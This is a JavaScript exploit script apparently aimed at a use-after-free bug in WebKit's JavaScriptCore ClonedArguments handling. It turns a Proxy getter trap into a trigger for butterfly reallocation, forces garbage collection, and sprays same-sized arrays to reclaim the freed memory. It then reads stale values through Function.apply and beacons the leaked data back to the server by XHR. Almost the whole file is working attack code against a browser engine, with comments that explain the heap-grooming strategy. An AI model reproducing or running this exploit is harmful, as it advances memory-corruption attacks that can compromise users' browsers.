// p246 - ClonedArguments UAF with CORRECT reclaim strategy
//
// Key insight: butterflies are allocated from jsValueGigacageAuxiliarySpace
// which uses MarkedSpace. ArrayBuffer backing stores use a DIFFERENT subspace.
// So spraying ArrayBuffers can NEVER reclaim a freed butterfly slot.
//
// Instead: spray JSArrays whose butterflies match the old butterfly's size.
// These go through the SAME jsValueGigacageAuxiliarySpace, so the GC's
// MarkedBlock free list can reuse the old butterfly's slot.
//
// Butterfly size for 8 contiguous args:
//   outOfLine(4*8=32) + IndexingHeader(8) + contiguous(8*8=64) = 104 bytes
// MarkedSpace rounds to a size class. For 104 bytes, likely 112 or 128.
//
// Strategy:
// 1. Trigger convertContiguousToArrayStorage (orphans old butterfly)
// 2. Trigger GC to sweep the old butterfly's MarkedBlock
// 3. Spray JSArrays with 8 indexed elements (butterflies ~ same size)
// 4. Fill spray array butterflies with marker JSValues
// 5. Stale data[] reads from reclaimed slot = marker values
//
// Beacon prefix: V246-

(function() {
  function B(tag, body) {
    try {
      var x = new XMLHttpRequest();
      var url = '/beacon/V246-' + tag + '?t=' + Date.now();
      if (body) {
        x.open('POST', url, true);
        x.setRequestHeader('Content-Type', 'text/plain');
        x.send(String(body).substring(0, 900));
      } else {
        x.open('GET', url, true);
        x.send();
      }
    } catch(e) {}
  }

  function hex(v) {
    return ('00000000' + (v >>> 0).toString(16)).slice(-8);
  }

  B('BOOT');

  // Pre-warm: create and discard many arrays to fill MarkedBlocks
  // This ensures the butterfly allocator has used pages and free lists
  try {
    var warmup = [];
    for (var i = 0; i < 10000; i++) {
      var a = [1,2,3,4,5,6,7,8];
      warmup.push(a);
    }
    warmup = null; // Will be collected on GC
    B('WARMUP-OK');
  } catch(e) {
    B('WARMUP-ERR-' + e.message.substring(0, 30));
  }

  // The actual UAF exploit
  function attempt(round) {
    var sprayArrays = [];

    function mkClonedArgs() {
      // Use 8 arguments to match butterfly size
      delete arguments[2]; // Create hole at index 2

      var self = arguments;
      var hitTrap = false;

      Object.setPrototypeOf(arguments, new Proxy({}, {
        get: function(t, prop) {
          if (!hitTrap && prop === '2') {
            hitTrap = true;

            // Step 1: Convert Contiguous to ArrayStorage
            // This orphans the old butterfly
            self[0x7fffffff] = 1;
            delete self[0x7fffffff];

            // Step 2: Force GC to sweep the orphaned butterfly
            // Allocate lots of objects to trigger eden + full GC
            // Then null them to make them collectible
            var pressure = [];
            for (var g = 0; g < 50; g++) {
              var batch = new Array(5000);
              for (var k = 0; k < batch.length; k++) {
                batch[k] = {x: k, y: [1]};
              }
              pressure.push(batch);
            }
            // Release all pressure objects
            pressure = null;

            // Step 3: More GC pressure to actually sweep
            for (var g2 = 0; g2 < 20; g2++) {
              var j = new Array(10000);
              for (var k = 0; k < j.length; k++) j[k] = [k];
              j = null;
            }

            // Step 4: Spray JSArrays with matching butterfly size
            // Each array has 8 indexed elements → butterfly ~104 bytes
            // The butterfly contiguous data will contain our marker values
            // which are JSValue-encoded integers
            for (var s = 0; s < 5000; s++) {
              var arr = new Array(8);
              for (var e = 0; e < 8; e++) {
                // Write marker values as integers
                // These are stored as NaN-boxed int32: 0xFFFE0000_XXXXXXXX
                arr[e] = 0xCAFE0000 + round * 10000 + s * 10 + e;
              }
              sprayArrays.push(arr);
            }

            B('R' + round + '-SPRAYED-' + sprayArrays.length);
          }
          // Return a recognizable value for the hole
          return 0xBEEF0000 + round;
        }
      }));

      return arguments;
    }

    var cloned = mkClonedArgs(
      0xAAAA0001, 0xAAAA0002, 0xAAAA0003,
      0xAAAA0004, 0xAAAA0005, 0xAAAA0006,
      0xAAAA0007, 0xAAAA0008
    );

    // Trigger copyToArguments via .apply
    function collector() {
      return Array.prototype.slice.call(arguments);
    }
    var result;
    try {
      result = collector.apply(null, cloned);
    } catch(e) {
      B('R' + round + '-APPLY-ERR-' + e.message.substring(0, 40));
      return;
    }

    if (!result) {
      B('R' + round + '-NO-RESULT');
      return;
    }

    B('R' + round + '-LEN-' + result.length);

    // Analyze results
    var cafeHits = 0;
    var origHits = 0;
    var otherHits = 0;
    var vals = [];

    for (var i = 0; i < result.length; i++) {
      var v = result[i];
      if (typeof v !== 'number') {
        vals.push(i + '=T:' + typeof v);
        otherHits++;
        continue;
      }
      var u = v >>> 0;
      vals.push(i + '=' + hex(u));

      if ((u >>> 16) === 0xCAFE) {
        cafeHits++;
      } else if (u === 0xAAAA0001 + i) {
        origHits++;
      } else if ((u >>> 16) === 0xBEEF) {
        // Proxy return value for holes
      } else if (u === 0) {
        // Undefined
      } else {
        otherHits++;
      }
    }

    B('R' + round + '-VALS', vals.join(' '));
    B('R' + round + '-CAFE-' + cafeHits + '-ORIG-' + origHits + '-OTHER-' + otherHits);

    if (cafeHits > 0) {
      B('R' + round + '-RECLAIM-HIT');
      // Try to identify which spray array landed in the slot
      for (var s = 0; s < sprayArrays.length; s++) {
        var arr = sprayArrays[s];
        if (arr[0] === result[0] || arr[3] === result[3]) {
          B('R' + round + '-SPRAY-IDX-' + s);
          break;
        }
      }
    }
  }

  // Run multiple rounds
  for (var r = 0; r < 3; r++) {
    try {
      attempt(r);
    } catch(e) {
      B('R' + r + '-ERR-' + e.message.substring(0, 60));
    }
  }

  B('DONE');
})();
